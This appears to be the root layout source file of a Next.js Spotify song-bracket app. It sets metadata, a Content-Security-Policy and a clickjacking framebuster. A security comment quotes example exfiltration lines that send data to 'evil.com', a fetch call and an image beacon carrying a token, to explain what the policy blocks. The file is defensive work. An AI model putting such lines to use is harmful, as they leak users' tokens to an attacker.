import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
  display: "swap",
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
  display: "swap",
});

const SITE_URL = "https://jhomer192.github.io/bracketeering";
const TITLE = "Bracketeering — Vote your way to your real top 10";
const DESCRIPTION =
  'Vote "this or that" on 128 of your songs. Walk away with a real top 10 — and a Spotify playlist that proves it.';

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: { default: TITLE, template: "%s · Bracketeering" },
  description: DESCRIPTION,
  applicationName: "Bracketeering",
  authors: [{ name: "Jack Homer" }],
  keywords: [
    "Spotify",
    "music ranking",
    "top songs",
    "playlist",
    "tournament bracket",
    "music discovery",
  ],
  openGraph: {
    type: "website",
    url: SITE_URL,
    siteName: "Bracketeering",
    title: TITLE,
    description: DESCRIPTION,
  },
  twitter: {
    card: "summary_large_image",
    title: TITLE,
    description: DESCRIPTION,
  },
  robots: { index: true, follow: true },
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  // No `maximumScale` — pinch-zoom is an a11y need (low-vision users) and
  // the bracket UX has no real motive to lock it. Past iOS bugs that made
  // double-tap-to-zoom interfere with rapid taps are no longer relevant
  // on modern viewports.
  // Match brand bg so the iOS status bar / Android URL bar tint into the app.
  themeColor: "#09090b",
  colorScheme: "dark",
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    // `data-theme="dark"` + `color-scheme: dark` keeps native form controls
    // (selects, scrollbars) in dark mode regardless of the user's OS pref.
    // Bracketeering is intentionally dark-only — see globals.css comment.
    <html
      lang="en"
      data-theme="dark"
      style={{ colorScheme: "dark" }}
      className={`${geistSans.variable} ${geistMono.variable} h-full antialiased`}
    >
      <head>
        {/* Security posture for a GitHub-Pages static SPA — no HTTP headers
            available, so the meaningful pieces live in <meta> + a tiny
            framebuster.
              - CSP via meta has real teeth on connect-src and img-src:
                an XSS injecting `fetch("https://evil.com")` is blocked,
                and an `<img src="//evil.com/log?token=...">` is blocked.
              - script-src needs 'unsafe-inline' because Next.js's static
                export inlines hashed bootstrap scripts with no nonce.
                Off-origin <script src> is restricted to open.spotify.com,
                which hosts the Iframe Embed API used by the preview player.
              - frame-ancestors is IGNORED in meta (CSP3 mandates HTTP
                header only). Clickjacking protection is enforced below
                via the inline framebuster.
              - referrer policy: don't leak the OAuth ?code= or ?state=
                back to upstream sites if a user middle-clicks a link. */}
        <meta
          httpEquiv="Content-Security-Policy"
          content={[
            "default-src 'self'",
            // open.spotify.com serves the bootstrap loader for the Iframe
            // Embed API (`/embed/iframe-api/v1`); the loader injects the
            // real API code from embed-cdn.spotifycdn.com. Both origins
            // must be allow-listed or `onSpotifyIframeApiReady` never
            // fires and previews silently no-op. Spotify deprecated
            // `preview_url` in late 2024, so this iframe is the only
            // path that actually plays audio.
            //
            // `'unsafe-eval'` is required by Spotify's iframe bundle — it
            // uses `new Function()` / `eval` internally. Note CSP doesn't
            // scope unsafe-eval per-origin; this opens it globally.
            // Acceptable trade-off because:
            //   - `'unsafe-inline'` is already required by Next.js static
            //     export (no nonce available), so the strict-XSS property
            //     of script-src was never available here in the first
            //     place. Adding unsafe-eval doesn't widen the surface.
            //   - We have no server-rendered injection point — every page
            //     is statically prerendered from build-time data.
            //   - The high-value defenses live in connect-src (no exfil
            //     to evil.com) and img-src (no pixel beacons), which
            //     remain strict.
            "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://open.spotify.com https://embed-cdn.spotifycdn.com",
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' https://i.scdn.co https://mosaic.scdn.co data: blob:",
            "font-src 'self' data:",
            "connect-src 'self' https://api.spotify.com https://accounts.spotify.com",
            // OAuth redirect uses `window.location.href` (navigation), not a
            // <form> submit — `form-action 'self'` is enough; no need to
            // allow accounts.spotify.com here.
            "form-action 'self'",
            "frame-src https://open.spotify.com",
            "base-uri 'self'",
            "object-src 'none'",
          ].join("; ")}
        />
        <meta name="referrer" content="strict-origin-when-cross-origin" />
        {/* JS framebuster — replaces the missing X-Frame-Options. If the page
            is being framed by a different origin, redirect the top frame to
            our URL so the embedding site loses control. The cross-origin
            `top.location` read deliberately throws on hostile frames; we
            catch and force the redirect via `top = self`. */}
        <script
          // eslint-disable-next-line react/no-danger
          dangerouslySetInnerHTML={{
            __html:
              "try{if(self!==top){top.location=self.location}}catch(e){top.location=self.location}",
          }}
        />
      </head>
      <body className="min-h-full flex flex-col bg-[var(--bg)] text-[var(--fg)]">
        {children}
      </body>
    </html>
  );
}
